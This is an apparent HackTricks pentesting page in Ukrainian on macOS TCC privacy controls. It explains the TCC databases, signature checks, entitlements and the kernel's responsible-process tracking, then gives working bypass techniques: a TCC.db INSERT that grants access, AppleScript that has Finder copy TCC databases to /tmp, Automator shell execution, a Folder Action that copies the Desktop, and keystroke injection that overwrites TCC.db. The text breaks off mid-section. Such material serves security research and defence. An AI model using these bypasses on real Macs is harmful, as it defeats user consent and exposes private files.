# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Основна інформація**

**TCC (Transparency, Consent, and Control)** — це протокол безпеки, що регулює дозволи програм. Його основне призначення — захист конфіденційних функцій, таких як **служби геолокації, контакти, фотографії, мікрофон, камера, доступність і повний доступ до диска**. Вимагаючи явної згоди користувача перед наданням програмам доступу до цих функцій, TCC посилює конфіденційність і контроль користувачів над своїми даними.

Користувачі стикаються з TCC, коли програми запитують доступ до захищених функцій. Це відбувається у вигляді запиту, який дає змогу користувачам **дозволити або заборонити доступ**. Крім того, TCC підтримує прямі дії користувача, як-от **перетягування файлів у програму**, щоб надати доступ до певних файлів і гарантувати, що програми матимуть доступ лише до явно дозволених даних.

![Приклад запиту TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

Роботу **TCC** забезпечує **демон**, розташований за шляхом `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` і налаштований у файлі `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (реєструє Mach-службу `com.apple.tccd.system`).

Для кожного користувача, який увійшов у систему, працює окремий **tccd у режимі користувача**, визначений у файлі `/System/Library/LaunchAgents/com.apple.tccd.plist`; він реєструє Mach-служби `com.apple.tccd` і `com.apple.usernotifications.delegate.com.apple.tccd`.

Нижче показано tccd, запущений від імені системи та користувача:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Дозволи **успадковуються від батьківського** застосунку, а **дозволи** **відстежуються** за **Bundle ID** і **Developer ID**.

### Бази даних TCC

Дозволи та заборони зберігаються в кількох базах даних TCC:

- Загальносистемна база даних **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Ця база даних **захищена SIP**, тому записувати до неї можна лише в разі обходу SIP.
- База даних TCC користувача **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** з налаштуваннями для окремого користувача.
  - Ця база даних захищена, тому записувати до неї можуть лише процеси з високими привілеями TCC, як-от Full Disk Access (але вона не захищена SIP).

> [!WARNING]
> Попередні бази даних також **захищені TCC від читання**. Тож ви **не зможете прочитати** звичайну базу даних TCC свого користувача, якщо робитимете це не з процесу з привілеями TCC.
>
> Однак пам’ятайте, що процес із такими високими привілеями (як-от **FDA** або **`kTCCServiceEndpointSecurityClient`**) зможе записувати до бази даних TCC користувача.

- Є **третя** база даних TCC — **`/var/db/locationd/clients.plist`**, яка вказує клієнтів, яким дозволено **доступ до служб геолокації**.
- У **`/Library/Application Support/com.apple.TCC/REG.db`** записані зареєстровані шляхи до баз даних TCC. Підставлена база даних користувача може бути відхилена, якщо її не зареєстровано; знання цього шляху саме по собі не надає доступу до жодної з баз даних.<sup>[[6]](#references)</sup>
- У **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** містяться керовані рішення Privacy Preferences Policy Control (PPPC). Перевірте цей файл, якщо застосунок має керований дозвіл, якого немає серед звичайних рядків `access`.<sup>[[7]](#references)</sup>
- Захищений SIP файл **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (але доступний для читання всім) — це список дозволених застосунків, яким потрібен виняток TCC.

> [!TIP]
> База даних TCC в **iOS** розташована за шляхом **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **Інтерфейс Центру сповіщень** може **вносити зміни до загальносистемної бази даних TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Однак користувачі можуть **скидати правила** за допомогою утиліти командного рядка **`tccutil`**; вона не має документованої операції запиту.<sup>[[4]](#references)</sup>

#### Запит до баз даних

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Перевіривши обидві бази даних, можна дізнатися, які дозволи застосунок має, які йому заборонено або яких він не має (запит на них з’явиться).

- **`service`** — це рядкове представлення дозволу TCC
- **`client`** — це **bundle ID** або **шлях до бінарного файлу**, для якого надано дозволи
- **`client_type`** вказує, чи це Bundle Identifier (0), чи абсолютний шлях (1)

<details>

<summary>Як виконати, якщо це абсолютний шлях</summary>

Просто виконайте **`launctl load you_bin.plist`**, використавши plist на зразок такого:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** може мати різні значення: denied(0), unknown(1), allowed(2) або limited(3).
- **`auth_reason`** може мати такі значення: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Поле **csreq** вказує, як перевірити бінарний файл, який потрібно виконати, і надати йому дозволи TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Докладніше про **інші поля** таблиці див. [**у цій публікації блогу**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Також можна перевірити **вже надані дозволи** для програм у `Системні параметри --> Безпека й конфіденційність --> Приватність --> Файли й папки`.

> [!TIP]
> Користувачі можуть **скидати** правила за допомогою **`tccutil`**, але для перевірки наданих дозволів потрібно дослідити бази даних.<sup>[[4]](#references)</sup>

#### Скидання дозволів TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Визначення дозволів для відправника та цілі Apple Events

Дозвіл Automation — це рішення **відправник-ціль**, а не дозвіл керувати кожною програмою. Маючи доступ до бази даних користувача, перелічіть дозволені пари відправник/ціль, перш ніж переходити до описаних нижче сценаріїв із [Apple Events](macos-apple-events.md) або Finder. `csreq` ідентифікує відправника, а `indirect_object_code_identity` — ціль; декодуйте будь-який ненульовий blob за допомогою описаного вище методу `csreq`.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Перевірки підпису TCC

У **базі даних** TCC зберігається **Bundle ID** застосунку, а також **інформація** про **підпис**, щоб **переконатися**, що застосунок, який запитує дозвіл, є саме тим, за який себе видає.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Тому інші програми з такою самою назвою та bundle ID не зможуть отримати доступ до дозволів, наданих іншим програмам.

### Entitlements і дозволи TCC

Надання дозволу через TCC не скасовує обмежень **App Sandbox**. Клієнту камери в sandbox потрібен `com.apple.security.device.camera`; Apple також надає цю можливість програмам із Hardened Runtime. Жоден із цих entitlements не обходить окремий запит згоди користувача. Не вважайте entitlement для sandbox безумовною вимогою для кожного процесу поза sandbox. Якщо запит завершується помилкою, перевірте entitlements виконуваного файла та відповідальної програми.<sup>[[8]](#references)[[9]](#references)</sup>

Зверніть увагу, що entitlements — це plist-файли, які є частиною code sig. Вони додатково хешуються в code sig за допомогою спеціальних слотів; їх може запитувати як ядро, так і код у user mode за допомогою `csops(#169)` або `csops_audittoken(#170)`.

Однак для **доступу** до **певних папок користувача**, таких як `~/Desktop`, `~/Downloads` і `~/Documents`, програмам **не потрібні** жодні спеціальні **entitlements**. Система прозоро обробляє доступ і за потреби **запитує згоду користувача**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Програми Apple **не показуватимуть запитів**. У списку **entitlements** вони мають **заздалегідь надані права**, тобто **ніколи не показуватимуть спливне вікно** і **не з’являтимуться** в базах даних **TCC**. Наприклад:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Це не дозволить Calendar запитувати в користувача доступ до нагадувань, календаря та адресної книги.

> [!TIP]
> Окрім деякої офіційної документації про entitlements, також можна знайти неофіційну **цікаву інформацію про entitlements на** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Деякі дозволи TCC: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Загальнодоступного списку всіх дозволів немає, але можна переглянути цей [**список відомих дозволів**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Чутливі незахищені місця

- $HOME (сам каталог)
- $HOME/.ssh, $HOME/.aws тощо
- /tmp

### Намір користувача / com.apple.macl

Як згадувалося раніше, **можна надати застосунку доступ до файла, перетягнувши його в цей застосунок**. Цей доступ не буде зазначено в жодній базі даних TCC, натомість він зберігатиметься як **розширений атрибут файла**. У цьому атрибуті зберігатиметься **UUID** дозволеного застосунку:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Цікаво, що атрибут **`com.apple.macl`** контролює **Sandbox**, а не tccd.
>
> Також зауважте: якщо перемістити файл, який дозволяє UUID програми на вашому комп’ютері, на інший комп’ютер, доступ до нього не буде надано цій програмі, оскільки на іншому комп’ютері та сама програма матиме інший UID.

Розширений атрибут `com.apple.macl` **не можна очистити** так само, як інші розширені атрибути, оскільки він **захищений SIP**. Однак, як [**пояснено в цій публікації**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), цей захист можна обійти, **заархівувавши** файл, **видаливши** його й **розпакувавши** архів.<sup>[[3]](#references)</sup>






## Механізм відповідального процесу XNU

У macOS/iOS механізм **відповідального процесу** — це важлива функція безпеки, яку використовує фреймворк **TCC (Transparency, Consent, and Control)** та інші системи безпеки, щоб визначити, який процес зрештою відповідає за дію, навіть якщо вона виконується ланцюжком дочірніх процесів.

Коли TCC перевіряє дозволи (наприклад, на камеру, мікрофон чи місцезнаходження), він не завжди перевіряє процес, який безпосередньо надсилає запит. Натомість він перевіряє **відповідальний процес** — зазвичай графічну програму, яка ініціювала дію, навіть якщо фактичний запит надходить від допоміжного процесу або демона.

Щоб визначити програму, якій фактично приписано запит, під час виконання захищеної операції відстежуйте повідомлення TCC `AttributionChain`. Це надійніше, ніж надавати дозвіл допоміжному виконуваному файлу лише тому, що саме він викликав API. Порівняйте вказану ідентичність з ідентифікатором пакета або шляхом і вимогою підпису у відповідному рядку `access`.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Як задається відповідальний процес</summary>

### Поля структури процесу

Кожен процес у XNU містить два ключові ідентифікатори UUID:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: Власний UUID процесу (з команди завантаження `LC_UUID` його бінарного файлу Mach-O)
- **`p_responsible_pid`**: PID відповідального процесу
- **`p_responsible_uuid`**: UUID відповідального процесу (зберігається, навіть якщо цей процес завершує роботу)

### Як призначається відповідальний процес

1. **Під час створення процесу (Fork)**

Коли новий процес створюється через `fork()` або `posix_spawn()`, він успадковує відповідальний процес від батьківського (системний виклик `exec()` повторно використовує наявну структуру `proc`, тож цей крок не повторюється):

**Розташування**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Ключові моменти:**
- Дочірні процеси **успадковують** `p_responsible_pid` батьківського процесу
- Це створює **ланцюжок відповідальності** в ієрархії процесів
- Відповідальний процес зазвичай вказує на початкову GUI-програму

2. **Основна функція: `proc_set_responsible_pid()`**

**Розташування**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Що робить ця функція:**
1. **Задає відповідальний PID** у цільовому процесі
2. **Знаходить відповідальний процес** за допомогою `proc_find()` (збільшує лічильник посилань)
3. **Копіює UUID** з `p_uuid` відповідального процесу в `p_responsible_uuid` цільового процесу
4. **Звільняє посилання** за допомогою `proc_rele()` (зменшує лічильник посилань)

3. **Навіщо зберігати і PID, і UUID?**

Підхід із подвійним зберіганням розв’язує критичну проблему:

| Поле | Призначення | Проблема | Рішення |
|-------|---------|----------|----------|
| `p_responsible_pid` | Швидкий пошук поточного процесу | PID може бути повторно використаний після завершення процесу | Використовується для пошуку активного процесу |
| `p_responsible_uuid` | Постійна ідентифікація | Зберігається після завершення процесу | Використовується для перевірок безпеки та аудиту |

**Проблема**: Якщо відповідальний процес завершується раніше за дочірній, PID може бути повторно використаний і призначений зовсім іншому процесу.

**Рішення**: UUID є незмінним і однозначно ідентифікує конкретний бінарний файл, який був відповідальним, навіть після завершення процесу.

### Процес створення процесу

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Джерело UUID: команда завантаження LC_UUID

UUID, що зберігається в `p_uuid`, походить із команди завантаження **LC_UUID виконуваного файлу Mach-O**:

1. **Час компіляції**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Час виконання**

**Розташування**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Зберігається у структурі процесу**

**Location**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Location**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc і обходи

### Додавання до TCC

Якщо вам у якийсь момент вдасться отримати доступ на запис до бази даних TCC, можна скористатися чимось на кшталт наведеного нижче, щоб додати запис (видаліть коментарі):

<details>

<summary>Приклад додавання до TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Якщо вам вдалося отримати доступ до застосунку з деякими дозволами TCC, перегляньте цю сторінку з TCC payloads, щоб зловживати ними:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Дізнайтеся про Apple Events тут:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Автоматизація (Finder) до FDA\*

Назва дозволу Automation у TCC: **`kTCCServiceAppleEvents`**\
Цей конкретний дозвіл TCC також визначає **застосунок, яким можна керувати** в базі даних TCC (тобто дозволи не надають права керувати чим завгодно).

**Finder** — це застосунок, який **завжди має FDA** (навіть якщо він не відображається в інтерфейсі), тож якщо у вас є привілеї **Automation** щодо нього, ви можете зловживати ними, щоб **змусити його виконувати певні дії**.\
У цьому випадку вашому застосунку потрібен дозвіл **`kTCCServiceAppleEvents`** щодо **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Один описаний варіант запису, якщо доступний шлях Automation до Finder, полягає в тому, щоб змусити Finder **перейменувати каталог користувача `com.apple.TCC`**. Потім базу даних за перейменованим шляхом копіювали до каталогу для підготовки, змінювали там, копіювали назад і відновлювали початкову назву каталогу. Новий запис `kTCCServiceAppleEvents` має ідентифікувати **і бінарний файл-відправник, і Finder**, зокрема їхні вимоги до коду; надання дозволу відправнику без ідентифікації цілі — це не те саме. Цей метод залежить від шляху, тому перевірте його на цільовій версії macOS, а не припускайте, що Automation для Finder сама по собі надає довільний доступ на запис до бази даних.<sup>[[11]](#references)</sup>

> [!WARNING]
> З цим дозволом ви зможете **попросити Finder отримати доступ до папок, обмежених TCC,** і надати вам файли, але, наскільки мені відомо, **не зможете змусити Finder виконувати довільний код**, щоб повністю зловживати його доступом FDA.
>
> Тому ви не зможете зловживати всіма можливостями FDA.

Це запит TCC для отримання прав Automation над Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Зверніть увагу: оскільки застосунок **Automator** має дозвіл TCC **`kTCCServiceAppleEvents`**, він може **керувати будь-яким застосунком**, наприклад Finder. Тож маючи дозвіл керувати Automator, ви також зможете керувати **Finder** за допомогою коду нижче:

<details>

<summary>Отримати shell усередині Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Те саме відбувається з **додатком Script Editor**: він може керувати Finder, але за допомогою AppleScript не можна змусити його виконати скрипт.

### Автоматизація (SE) для деяких TCC

**System Events може створювати Folder Actions, а Folder Actions можуть отримувати доступ до деяких папок TCC** (Desktop, Documents і Downloads), тому для зловживання цією поведінкою можна використати такий скрипт:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Автоматизація (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) до FDA*

Автоматизація **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) дає змогу надсилати **натискання клавіш процесам**. Так можна зловживати Finder, щоб змінити TCC.db користувача або надати FDA довільному застосунку (хоча може з’явитися запит на введення пароля).

Приклад перезапису TCC.db користувача через Finder:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` до FDA\*

Перегляньте цю сторінку, щоб знайти [**payloads для зловживання дозволами Accessibility**](macos-tcc-payloads.md#accessibility), які дають змогу підвищити привілеї до FDA\* або, наприклад, запустити keylogger.

### **Endpoint Security Client до FDA**

Якщо у вас є **`kTCCServiceEndpointSecurityClient`**, у вас є FDA. Крапка.

### System Policy SysAdmin File до FDA

**`kTCCServiceSystemPolicySysAdminFiles`** дає змогу **змінити** атрибут **`NFSHomeDirectory`** користувача, що змінює його домашню папку й, відповідно, дає змогу **обійти TCC**.<sup>[[5]](#references)</sup>

### База даних TCC користувача до FDA

Отримавши **дозволи на запис** до **бази даних TCC користувача**, ви **не зможете** надати собі дозволи **`FDA`** — це може зробити лише база даних системного рівня.

Однак ви можете надати собі **права Automation для Finder** і зловжити попереднім методом, щоб підвищити привілеї до FDA\*.

### **FDA до дозволів TCC**

Назва **Full Disk Access** у TCC — **`kTCCServiceSystemPolicyAllFiles`**.

Не думаю, що це справжній privesc, але, можливо, це стане вам у пригоді: якщо ви контролюєте програму з FDA, то можете **змінити базу даних TCC користувача й надати собі будь-який доступ**. Це може бути корисно як техніка persistence на випадок, якщо ви втратите дозволи FDA.

### **Обхід SIP для обходу TCC**

Системна **база даних TCC** захищена **SIP**, тому змінювати її можуть лише процеси з **відповідними entitlements**. Отже, якщо зловмисник знайде **обхід SIP** для **файлу** (зможе змінити файл, захищений SIP), він зможе:

- **Зняти захист** із бази даних TCC і надати собі всі дозволи TCC. Наприклад, він може зловживати будь-яким із цих файлів:
  - Системна база даних TCC
  - REG.db
  - MDMOverrides.plist

Однак є й інший спосіб зловжити цим **обходом SIP для обходу TCC**: файл `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` містить список дозволених програм, яким потрібен виняток TCC. Тому, якщо зловмисник може **зняти захист SIP** із цього файлу й додати **власну програму**, вона зможе обходити TCC.\
Наприклад, щоб додати Terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

